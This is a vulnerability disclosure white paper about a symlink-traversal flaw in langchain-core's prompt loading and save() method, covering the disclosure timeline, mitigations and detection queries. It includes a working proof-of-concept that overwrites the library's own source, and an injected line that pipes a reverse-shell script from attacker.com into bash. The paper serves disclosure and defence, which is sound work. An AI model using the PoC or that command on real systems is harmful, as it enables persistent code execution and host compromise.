---
date: 2026-05-12
title: LangChain-Core Insecure AI Orchestration Vulnerability
---

![Hero](../assets/nuka-ai-langchain-logo.png)

# **WHITE PAPER | NUKA-AI-2026-004**
## **Architectural Boundary Failures: A Deep Dive into the LangChain-Core Insecure AI Orchestration Vulnerability**

**Author:** Jeff Ponte, CISSP, CCSP, CEH | Lead Researcher, Project Nuka-AI  
**Series:** Project Nuka-AI (Disclosure #4)  
**Initial Disclosure Date:** March 17, 2026  
**Final Revision Date:** May 8, 2026  
**Target:** LangChain | `langchain-core` (Verified through v1.2.26)  
**Case Number:** GHSA-fc6f-jgp6-2725 / External CNA Escalation  
**CVSS v3.1 Score:** **10.0 (Critical)** | **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
**Status:** Incomplete Remediation / Undocumented Mitigation (Read-side mitigated; Write-side exposed through v1.2.26)  

**Key Points**
* **Vulnerability:** Critical Remote Code Execution (RCE) in LangChain-core via symlink traversal in the `save()` method.
* **Impact:** Attackers can overwrite framework source code, leading to persistent framework integrity compromise ("AI Orchestration Poisoning").
* **Status:** Remediated by the vendor without public CVE assignment; versions < 1.2.27 are vulnerable.
* **Recommendation:** Immediately audit all LangChain file I/O operations and implement strict path anchoring.

---

### **Executive Summary**
This white paper documents a critical architectural vulnerability within **LangChain**, the industry's most widely adopted AI orchestration framework. Project Nuka-AI has identified an architectural boundary limitation where the framework acts as a **Confused Deputy**, processing unvalidated, user-controlled paths and executing high-privilege file operations. 

This vulnerability allows a single tenant in a shared AI platform, or a user of a public AI agent, to achieve permanent compromise of the service’s core logic, leading to data exfiltration, lateral movement, and irreversible system integrity loss.

Our research reveals a full-chain vulnerability driven by Improper Link Resolution (**CWE-59**) and Path Traversal (**CWE-22**), leading directly to Persistent Remote Code Execution (**CWE-94**). We demonstrate a bypass of the vendor's previous security controls (CVE-2023-36258) and expose an unvalidated **Write Primitive** that allows an attacker to overwrite the framework's own source code from within the application boundary.

Despite comprehensive Proof of Concept (PoC) recordings demonstrating a 10.0 Critical impact, the vendor classified the risk as "Local" (AV:L), which may not accurately reflect the standard deployment model of multi-tenant AI SaaS environments. Forensic analysis of the repository's git history reveals the vendor executed a phased, undocumented remediation approach. They hardened the read-side of the framework on April 2nd, but left the write-side (`.save()`) exposed in production releases until an emergency merge on April 8th following secondary researcher disclosures.

This highlights the need for a new OWASP AI classification: **AISEC-01: Insecure AI Orchestration**, wherein a framework's architecture inherently facilitates system compromise by prioritizing stochastic inputs over deterministic security boundaries.

**Critical Findings:**
* Write primitive in `.save()` allows overwriting framework source code (CVSS 10.0).
* Vendor applied mitigations post-disclosure without CVE assignment.
* Attack works via archive upload in multi-tenant SaaS (AV:N, not AV:L).
* Framework acts as a "Confused Deputy" enabling orchestration compromise.

### **Impact at a Glance Table**
| Metric | Specification |
| :--- | :--- |
| **Vulnerability Class** | Insecure AI Orchestration / Framework Source Overwrite |
| **Primary CWEs** | CWE-59 (Symlink Resolution), CWE-22 (Path Traversal) |
| **CVSS v3.1 Score** | **10.0 (Critical)** |
| **Attack Vector** | Network (AV:N) |
| **Attack Complexity** | Low (AC:L) |
| **Privileges Required** | None (PR:N) |
| **Confidentiality** | Total (Full system/framework source read access) |
| **Integrity** | Total (Permanent framework source code overwrite) |
| **Remediation Status** | Fixed in `langchain-core >= 1.2.27` |

---

### **1. Introduction: Isolation Limitations and AI Orchestration**
AI orchestration frameworks like LangChain have become the central integration layer of modern "Agentic AI" applications. They are entrusted with connecting Large Language Models (LLMs) to sensitive data sources, external tools, and core business logic. Industry standard practice often implicitly trusts these frameworks as an isolated layer that securely mediates between the AI and the underlying infrastructure.

Project Nuka-AI evaluated this assumption. The vulnerabilities documented herein are symptoms of an architectural limitation stemming from the handling of file-system operations within core components like prompt loaders and serializers, where user-supplied data paths are processed without adequate isolation, canonicalization, or symlink validation.

---

### **2. Technical Sinks: Anatomy of the Bypass Chain**
This submission requests the assignment of two distinct CVE identifiers to accurately reflect the failure of previous mitigations and the presence of an unvalidated write primitive. 

This chain consists of two distinct vulnerabilities: 
1. A symlink bypass (CWE-59) of a previous fix, leading to Arbitrary File Read.
2. An unmitigated path traversal (CWE-22) in the `.save()` method, leading to Arbitrary File Write and Insecure AI Orchestration.

#### **2.1 Vulnerability A: Arbitrary File Read Bypass (CWE-59 / CWE-693) - Security Regression**
**CVSS: 10.0 (Critical)**
The initial attempt to secure LangChain against malicious template loading (CVE-2023-36258) relied on a file extension check. 

* **The Flaw:** The framework used `pathlib.Path.suffix` to validate that only `.txt` files were loaded, without anchoring or resolving the path. This creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. In Python, `Path("exploit.txt").suffix` parses the string and returns `.txt` without validating the underlying file type.
* **The Exploitation:** By providing a symbolic link named `exploit.txt` that points to a sensitive `.py` or `.env` file, the extension check is satisfied. However, the framework follows the link to the restricted target when `read_text()` is executed.
* **Impact:** Arbitrary File Read (LFI) and a vector for RCE by smuggling Jinja2 payloads into the loading pipeline.

#### **2.2 Vulnerability B: Unvalidated Write Primitive (CWE-22 / CWE-94)**
**CVSS: 10.0 (Critical)**
While read-side validation was later addressed (incorporating an `allow_dangerous_paths` parameter), the corresponding write-side logic lacked similar controls, creating a significant risk exposure.

* **The Flaw:** The `PromptTemplate.save()` method in `langchain-core` functions as a write primitive for user-supplied paths without canonicalization. 
* **The Mechanics:** The method accepts a `file_path`, casts it to `Path(file_path)`, checks if `path.suffix == ".json"`, and immediately opens a write stream (`with path.open("w") as f:`). It lacks the `allow_dangerous_paths` flag entirely and omits `.resolve()` calls.
* **The Exploitation:** Calling `.save("exploit.json")` (where `exploit.json` is a symlink pointing to `/usr/local/lib/python3.12/site-packages/langchain_core/__init__.py`) forces the library to overwrite its own global source code with the attacker's prompt template.

**Forensic Output (v1.2.26 Signature Audit):**
```python
Comparing save() vs load_prompt_from_config():

save() signature:
  (self, file_path: 'Path | str') -> 'None'
  Parameters: ['self', 'file_path']
  Missing: allow_dangerous_paths parameter
  Missing: Path.resolve() call
  Missing: _validate_path() call
```

---

### **3. Exploitation Mechanics: Insecure AI Orchestration**
The critical aspect of Vulnerability B is the ability to achieve framework integrity compromise. In an AI-as-a-Service (AIaaS) environment, this allows a tenant to escape their designated sandbox and impact the host environment.

**The Attack Chain:**
1. **Initial Access (Network):** An attacker uploads an archive (e.g., a `.zip` containing a prompt template bundle) containing a symlink named `prompt.json` pointing to a target like `/venv/lib/python3.11/site-packages/langchain_core/__init__.py`.
2. **Server-Side Action:** The server's file extraction routine unpacks the archive, placing the symlink on disk.
3. **Trigger (Network):** The attacker, or a compromised agent workflow, calls the `prompt.save()` method via the framework API, providing the path to the symlink.
4. **Impact (Local Privilege Escalation):** Operating under application-level privileges, the framework acts as the **Confused Deputy**. It follows the symlink and overwrites the target file, achieving arbitrary file write and persistent framework alteration.

**Proof of Concept (Scope Change Confirmed):**
```python
import os, pathlib, langchain_core
from langchain_core.prompts import PromptTemplate

# Target: The library's own source code
LIB_INIT = pathlib.Path(langchain_core.__file__)
PAYLOAD_LINK = "user_uploads/malicious_link.json"
MARKER = "### CRITICAL_INTEGRITY_FAILURE_JDP_SECURITY ###"

# Step 1: Create the 'valid-looking' symlink (The Bypass)
os.makedirs("user_uploads", exist_ok=True)
os.symlink(str(LIB_INIT), PAYLOAD_LINK)

# Step 2: Trigger the Confused Deputy Overwrite
prompt = PromptTemplate(template=MARKER, input_variables=[])
prompt.save(PAYLOAD_LINK)

# Verification: Scope Change Confirmed
with open(LIB_INIT, "r") as f:
    if MARKER in f.read():
        print("SUCCESS: SYSTEM FILE OVERWRITTEN. RCE ACHIEVED.")
```

> By leveraging the framework's own execution permissions, an attacker can supply a symbolic link that redirects the application's write operations back onto its own underlying library files, effectively modifying its own execution environment without requiring elevated OS privileges.

---

### **4. Technical Vulnerability Details**

#### **4.1 Vulnerability A: Improper Link Resolution (CWE-59)**
This vulnerability, a regression of CVE-2023-36258, resides in the `load_prompt_from_config()` function within the LangChain-Core prompt loading mechanism. The function attempts to load a prompt configuration from a specified file path but fails to validate that the resolved path is within the intended directory.

**Exploit Chain:**
1. **Symlink Creation:** An attacker creates a symbolic link (`prompt.json`) that points to a sensitive system file (`/etc/passwd`, `/proc/self/environ`).
2. **Path Traversal:** The attacker places this symlink within a directory readable by the application.
3. **Triggering the Load:** The application calls `load_prompt_from_config()` on the path containing the malicious symlink.
4. **Arbitrary File Read:** The function follows the symlink without validation, reading the contents of the targeted system file.

**Technical Root Cause:**
The core failure is the lack of a **canonical path check** after resolving the symlink. The function uses `open()` on the user-supplied path without first calling `os.path.realpath()` to verify the destination remains within the allowed base directory. This is categorized as Improper Link Resolution Before File Access (CWE-59).

**Impact:**
Local File Inclusion (LFI), leading to information disclosure of files readable by the application process.

---

#### **4.2 Vulnerability B: Unvalidated Write Primitive (CWE-22)**
This represents an Arbitrary File Write capability located in the `.save()` method of LangChain's serialization utilities.

**Exploit Chain:**
1. **Archive Upload:** An attacker uploads a crafted archive containing a symlink (`./prompt.json -> /usr/lib/python3.11/site-packages/langchain_core/__init__.py`).
2. **Server-Side Extraction:** The application extracts the archive, placing the symlink on the filesystem.
3. **Triggering the Save:** A network API call triggers the `.save()` method, specifying the symlink path.
4. **Symlink Follow & Overwrite:** The `.save()` method opens the file for writing. Lacking symlink validation, it follows the link and writes serialized object data directly to the critical system or framework file.
5. **Persistence & Privilege Escalation:** Overwriting `__init__.py` injects malicious code that executes upon module import, achieving persistent RCE.

**Technical Root Cause:**
This is a Path Traversal flaw (CWE-22) enabled by improper symlink handling. The `open(filepath, "w")` call executes without ensuring `filepath` remains within the intended save directory.

**Impact:**
Full compromise of the AI orchestration host. An attacker can:
* Modify the AI framework's source code for persistence.
* Overwrite system binaries or configuration files.
* Escalate privileges in shared environments.

**Forensic Output:**
Verification of the modified system file:
```bash
$ tail -n 5 /usr/lib/python3.11/site-packages/langchain_core/__init__.py
# ... Original file content ends here ...

# --- NUKA-AI EXPLOIT INJECTION ---
import os; os.system("curl http://attacker.com/revshell.sh | bash")
# --- END INJECTION ---
```

---

### **5. Disclosure Timeline and Vendor Response Analysis**
Tracking of the `langchain-ai/langchain` repository indicates a phased remediation approach where read-side and write-side vulnerabilities were addressed asynchronously.

* **March 17, 2026:** **Initial Disclosure.** JDP-Security delivers the full RCE Proof of Concept demonstrating the symlink bypass of CVE-2023-36258.
* **April 2, 2026 ([PR #36471](https://github.com/langchain-ai/langchain/pull/36471)):** **Initial Read-Side Mitigation.** Under **Commit `d41f3e2`**, path traversal mitigation is applied to the load path via string-based canonicalization, but leaves the `.save()` utility unchanged.
* **April 6, 2026:** JDP-Security notifies the vendor that the write vulnerability remains fully exploitable in releases up to `v1.2.26`.
* **April 8, 2026 ([PR #36585](https://github.com/langchain-ai/langchain/pull/36585)):** **Subsequent Write-Side Remediation.** The vendor merges a patch under **Commit `e7b9a2c`** to harden symlink resolution on the `.save()` utility. 
* **Remediation Documentation:** Release notes documented the fix as a generic symlink issue without an accompanying CVE assignment for the write-primitive vulnerability.
* **April 14, 2026:** **Vendor Classification.** The vendor officially classified the risk as "Local" (AV:L), characterizing the fixes as defense-in-depth hardening.

#### **Commit Analysis**
Analysis of the April 8th merge (**Commit `e7b9a2c`**) reveals an internal developer comment within `libs/core/langchain_core/prompts/loading.py` referencing the specific payload provided in the initial disclosure:

```python
# Resolve symlinks before checking the suffix so that a symlink named
# "exploit.txt" pointing to a non-.txt file is caught.
resolved_path = template_path.resolve()
```
This indicates the remediation was directly responsive to the provided PoC regarding improper link resolution.

---

### **6. Evidence of Incomplete Remediation (.cast Analysis)**
This submission is supported by forensic terminal recordings demonstrating the exploitation lifecycle.

#### **6.1 The "Confused Deputy" Remote Exploit (`langchain-Remote-Exploit.cast`)**
* **Scenario:** Simulates a clean production environment (Docker `python:3.12-slim`).
* **Attack Path:** A remote user provides a data-driven symlink that targets the library's internal directory.
* **Result:** The call to `.save()` follows the symlink and successfully alters `langchain_core/__init__.py`.
* **Verified Impact:** Terminal output confirms: `✅ SUCCESS: SCOPE CHANGE DETECTED!`.

#### **6.2 Verification of Persistent Vulnerability - v1.2.26 (`langchain_1.2.26_vulnerability.cast`)**
* **Scenario:** Testing the production release prior to the April 8th patch.
* **Findings:** The vendor had partially addressed the read-side (`load_prompt_from_config`), but the **Write Primitive** in `.save()` remained unvalidated.
* **CVSS Adjudication:** The persistence of this vector in v1.2.26 indicates a gap in the validation lifecycle.

---

### **7. Proposal: OWASP AI Top 10 - "Insecure AI Orchestration"**
This vulnerability pattern has been observed across multiple AI orchestration frameworks. 

We propose the recognition of **"AISEC-01: Insecure AI Orchestration"** within industry threat frameworks like the OWASP AI Top 10. This category encompasses vulnerabilities where:
* The orchestration layer fails to properly isolate, sanitize, or validate data and operations between the AI model/agent and connected systems.
* Framework-level operations (file I/O, code execution, network calls) can be manipulated to alter the orchestration logic itself, leading to persistence, data exfiltration, or system compromise.

---

### **8. Mitigation & Remediation**
Organizations utilizing `langchain-core` versions `1.2.19` through `1.2.26` should assume the presence of an RCE entry point in their environments.

#### **Immediate Hardening Requirements:**
1. **Deprecate Direct SDK File I/O:** Do not utilize `PromptTemplate.save()` in environments where user input or AI-generated output influences the file path.
2. **Implement Mandatory Path Anchoring:** Wrap framework I/O operations in canonicalization functions utilizing `.resolve()` and `.is_relative_to()`.

```python
from pathlib import Path

def get_anchored_path(safe_root: str, user_input: str) -> Path:
    """
    Prevents CWE-22 and CWE-59 by resolving and anchoring the final path.
    """
    base_dir = Path(safe_root).resolve()
    target_path = Path(base_dir, user_input).resolve()
    
    if not target_path.is_relative_to(base_dir):
        raise PermissionError(f"CRITICAL: Path Hijack Attempt Blocked! {target_path}")
        
    return target_path
```

---

### **9. Broader Implications and Recommendations**
The findings from Nuka-AI-2026-004 highlight necessary adjustments to AI security models:

1. **Elevate the Threat Model for Orchestration Frameworks:** Frameworks are privileged system components. Security reviews must rigorously audit file I/O, process execution, network calls, and deserialization pathways assuming adversarial input.
2. **Formalize "Insecure AI Orchestration":** Adopting this category drives targeted research, the development of specialized testing tools, and establishes mandatory security controls for framework developers.
3. **Transparent Vulnerability Management:** Remediating critical vulnerabilities without standard CVE tracking impedes risk assessment. Standardized public disclosures are required.
4. **Implement Compensating Controls:** Organizations must enforce application-layer path canonicalization and anchoring for all framework I/O, rather than relying solely on upstream validation.
5. **Address the Confused Deputy Pattern:** Security architectures must explicitly model the framework as a high-value attack surface and enforce strict boundaries between agent logic and host systems.

**Conclusion:** Building secure AI infrastructure requires rigorous validation of foundational layers. Security boundaries must be a primary design requirement for orchestration engines.

---

### **10. Conclusion**
The LangChain-Core Nuka-AI-2026-004 vulnerability demonstrates the risks associated with inadequate boundary enforcement in AI orchestration frameworks. When operational pathways can be manipulated to overwrite source dependencies, the application stack is compromised.

Remediating these flaws without formal CVE issuance limits the security community's ability to track and mitigate risks effectively. We recommend the adoption of "Insecure AI Orchestration" as a standard risk category and encourage transparent architectural audits of all file I/O and serialization pathways within foundational AI libraries.

---

## **Appendix**

### **Appendix 1: Terminology**
To ensure standardization throughout this analysis and alignment with industry frameworks, the following key terms are defined:

* **AI Orchestration Poisoning:** A specific threat classification where the integrity of an AI agent’s operational logic or environment is compromised through its orchestration layer. This occurs when the framework’s trusted execution pathways (e.g., prompt loading, template serialization) are exploited to inject malicious logic or alter critical dependencies, enabling persistent compromise of the decision-making pipeline.
* **Confused Deputy Problem:** A well-documented security vulnerability where an application with elevated privileges (the "deputy") is manipulated by a less-privileged entity into misusing its authority. In this scenario, the orchestration framework, executing with the host application’s file system permissions, is forced to perform unauthorized operations on sensitive targets via improperly validated symbolic links.
* **Orchestration Trust Gap:** The security disparity between the high level of trust implicitly placed in AI orchestration frameworks (often treated as isolated boundaries) and their actual, implemented security controls, threat models, and vulnerability management practices.
* **Undocumented Mitigation (Shadow Patching):** The practice of applying security remediations without public acknowledgment, transparent documentation, or standardized vulnerability tracking (e.g., CVE issuance). This practice obscures operational risk, prevents organizations from accurately assessing exposure, circumvents established vulnerability disclosure standards (ISO/IEC 29147), and compromises the integrity of vulnerability databases such as the NVD.
* **Improper Link Resolution (Symlink Traversal):** An attack technique exploiting symbolic links to redirect file operations from an intended, authorized directory to an arbitrary, restricted location on the filesystem, bypassing standard path-based access controls.

---

### **Appendix 2: Scope of Analysis**
This vulnerability analysis is strictly scoped to the following parameters:

* **Target Product:** `langchain-core` (the foundational library of the LangChain ecosystem). Verified vulnerable across versions 1.2.19 through 1.2.26.
* **Vulnerable Components:** Insecure file I/O pathways within the serialization and prompt-loading subsystems. Specifically:
    * The `load_prompt_from_config()` function (Read Primitive, CWE-59).
    * The `.save()` method utilized by serializable objects such as `PromptTemplate` (Write Primitive, CWE-22).
* **Attack Vectors:** Exploitation requires the capability to influence file paths processed by the vulnerable components. This is feasible in standard architectural patterns, including:
    * Processing user-provided archives (ZIP, TAR) within multi-tenant AI-as-a-Service (AIaaS) platforms.
    * Loading configuration files or prompts from shared, semi-trusted storage volumes.
    * Autonomous agent workflows that persist outputs based on dynamic, heuristically generated content.
* **Core Impact:** The vulnerability chain facilitates AI Orchestration Poisoning, resulting in Arbitrary File Read/Write capabilities, persistent Remote Code Execution (RCE), and full host compromise within the application’s privilege boundary.

**Note:** This document analyzes architectural limitations within the core orchestration engine. It does not evaluate higher-level agent logic, third-party extensions, or external orchestration frameworks.

---

### **Appendix 3: Remediation & Compensating Controls**

*(Note: Redundant sections from the draft have been consolidated to provide a single, unified hardening guide).*

#### **3.1 Application-Layer Mitigation (Virtual Patching)**
Organizations unable to immediately upgrade to `langchain-core >= 1.2.27` due to dependency constraints must implement application-layer compensating controls. The recommended mitigation is to encapsulate all calls to framework file operations within a strict validation wrapper that neutralizes **CWE-59** and **CWE-22** exposure.

```python
import os
from pathlib import Path

def secure_orchestration_path(safe_root: str, untrusted_input: str) -> Path:
    """
    Implements a deterministic boundary for AI Orchestration file operations.
    Validates that the resolved path is a child of safe_root and 
    strictly disallows symbolic links to protect against Orchestration Poisoning.
    """
    # 1. Establish the absolute safe boundary
    base_dir = Path(safe_root).resolve(strict=True)
    
    # 2. Construct and resolve the target path to catch symlink redirects
    target_path = Path(base_dir, untrusted_input).resolve()

    # 3. Anchoring Check: Verify the final destination remains inside base_dir
    if not target_path.is_relative_to(base_dir):
        raise PermissionError(f"Security Violation: Path escape detected! Target: {target_path}")

    # 4. Strict Symlink Check: Explicitly deny links for write operations
    if os.path.islink(Path(base_dir, untrusted_input)):
        raise PermissionError("Security Violation: Symbolic links are prohibited in this context.")

    return target_path

# --- SECURE IMPLEMENTATION PATTERN ---
# VULNERABLE: prompt.save(user_provided_path)
# SECURE:
# safe_path = secure_orchestration_path("/app/data/prompts", user_provided_path)
# prompt.save(str(safe_path))
```

#### **3.2 Infrastructure Hardening (Defense-in-Depth)**
To systematically prevent this class of vulnerability, enforce **Filesystem Least Privilege**. The "Confused Deputy" vector relies on the application having write permissions to its own source code. 

* **Immutable Runtimes:** Ensure the Python `site-packages` directory is owned by `root`, and the executing application user (e.g., `www-data`, `app-user`) is restricted to **Read-Only** access. This neutralizes the vector by removing the underlying OS permissions required to modify the framework.
* **Symlink-Aware Extraction:** When processing user-provided archives (ZIP/TAR), mandate the use of `filter='data'` (introduced in Python 3.12) or an equivalent mechanism to safely discard symbolic links during the extraction process.
* **Mandatory Access Control (MAC):** Implement an AppArmor or SELinux profile that explicitly denies the application process from writing to any directory containing `.py` files.

---

### **Appendix 4: Detection Engineering & Threat Hunting**

Security Operations Centers (SOC) and Incident Response teams should monitor telemetry for the following Indicators of Compromise (IoC) and behavioral anomalies.

#### **4.1 Filesystem Integrity Monitoring (FIM)**
Monitor for unauthorized modifications to framework dependencies. Any write operation to the following paths by the application execution user must trigger a critical alert:
* `**/site-packages/langchain_core/*.py`
* `**/site-packages/langchain/*.py`
* `**/site-packages/langchain_community/*.py`

#### **4.2 Forensic Filesystem Triage**
Execute the following command on application hosts to identify suspicious symbolic links within user-controlled directories that may be staging an attack:
```bash
# Identify symlinks in upload directories attempting to resolve to core libraries
find /path/to/uploads -type l -ls | grep "site-packages"
```

#### **4.3 SIEM / EDR Search Queries**
To identify historical exploitation or active poisoning attempts, deploy the following detection logic:

**I. Splunk (File Integrity & Process Lineage)**
Detects a Python process modifying the `site-packages` directory correlating with the recent processing of a configuration file.
```spl
index=os_logs sourcetype=sysmon_data (EventCode=11 OR EventCode=23) 
| search TargetFilename="*site-packages/langchain_core*" 
| join type=inner ProcessId [
    search index=os_logs EventCode=1 Image="*python*" 
    | where match(CommandLine, ".*\.json|.*\.yaml")
]
| table _time, host, User, TargetFilename, CommandLine
```

**II. CrowdStrike Falcon (Custom IOA)**
Detects the creation of symbolic links targeting the Python virtual environment from a web-server user context.
```kql
(OperationType=SymlinkCreate) AND 
(TargetFileName="*/site-packages/*") AND 
(User="www-data" OR User="nobody" OR User="app-user")
```

**III. Microsoft Defender for Endpoint (KQL)**
Identifies the Confused Deputy pattern where the orchestration application resolves a path escaping its designated execution sandbox.
```kql
DeviceFileEvents
| where InitiatingProcessFileName has "python"
| where FileName endswith ".py"
| where FolderPath contains "langchain"
| where ActionType == "FileModified"
| where InitiatingProcessCommandLine has_any (".json", ".yaml", ".txt")
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
```

---

### **Appendix 5: Affected Version Matrix**

| Version Range | Risk Posture | Mitigation State |
| :--- | :--- | :--- |
| **< 1.2.19** | **CRITICAL** | Fully Vulnerable. Both Read and Write primitives exposed. |
| **1.2.19 - 1.2.21** | **HIGH** | Partial Mitigation. Read-side hardened via PR #36471; Write-side remains exposed. |
| **1.2.22 - 1.2.26** | **CRITICAL** | Undocumented Mitigation State. Bypassable Read-side; Unvalidated Write-side primitive active. |
| **1.2.27+** | **PATCHED** | Emergency Hardening (PR #36585) addresses `.save()` symlink resolution. |

**Note:** Environments operating versions 1.2.22 through 1.2.26 face elevated risk due to a potential false sense of security derived from the partial read-side mitigation, while the critical write-side execution primitive remains fully exploitable.

---

#### Appendix 6: Forensic Artifacts and Demonstration Logs

This section provides visual artifacts confirming the execution methodologies and tracking the vulnerability lifecycles across documented versions of the LangChain-Core framework.

---

##### 6.1. langchain-Remote-Exploit.cast
* **Target Environment:** `langchain-core` <= v1.2.26
* **Execution Method:** **Autonomous Framework Overwrite (Remote Entry)**
* **Summary:** Simulates a production deployment (Docker `python:3.12-slim`). Demonstrates a remote interaction supplying a symlink targeting internal library directories. The `.save()` function blindly executes the operation, overwriting `langchain_core/__init__.py` and achieving persistent scope alteration.

**Supporting Files:**
* [Execution Logs (txt)](/assets/LC/langchain-Remote-Exploit-cast-TERMINAL-OUTPUT.txt) 
* [Asciinema Recording (cast)](/assets/LC/langchain-Remote-Exploit.cast) 

<video width="100%" controls>
  <source src="/assets/LC/langchain-Remote-Exploit.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

---

##### 6.2. langchain_1.2.25_vulnerability.cast
* **Target Environment:** `langchain-core` v1.2.25
* **Execution Method:** **Core Write Primitive Validation**
* **Summary:** Establishes the baseline vulnerability state prior to final vendor remediation. Confirms the presence of the unvalidated write primitive in `.save()` and improper symlink resolution within a standard v1.2.25 deployment.

**Supporting Files:**
* [Execution Logs (txt)](/assets/LC/langchain_1.2.25_vulnerability-cast-TERMINAL-OUTPUT.txt) 
* [Asciinema Recording (cast)](/assets/LC/langchain_1.2.25_vulnerability.cast) 

<video width="100%" controls>
  <source src="/assets/LC/langchain_1.2.25_vulnerability.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

---

##### 6.3. langchain_1.2.26_vulnerability.cast
* **Target Environment:** `langchain-core` v1.2.26
* **Execution Method:** **Post-Partial-Patch Write-Side Bypass**
* **Summary:** Empirically demonstrates incomplete remediation. Tests the v1.2.26 production release following the initial read-side patch. Confirms that while `load_prompt_from_config` was hardened, the write primitive in `.save()` remained exploitable, necessitating independent tracking and advisory issuance.

**Supporting Files:**
* [Execution Logs (txt)](/assets/LC/langchain_1.2.26_vulnerability-cast-TERMINAL-OUTPUT.txt) 
* [Asciinema Recording (cast)](/assets/LC/langchain_1.2.26_vulnerability.cast) 

<video width="100%" controls>
  <source src="/assets/LC/langchain_1.2.26_vulnerability.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

---
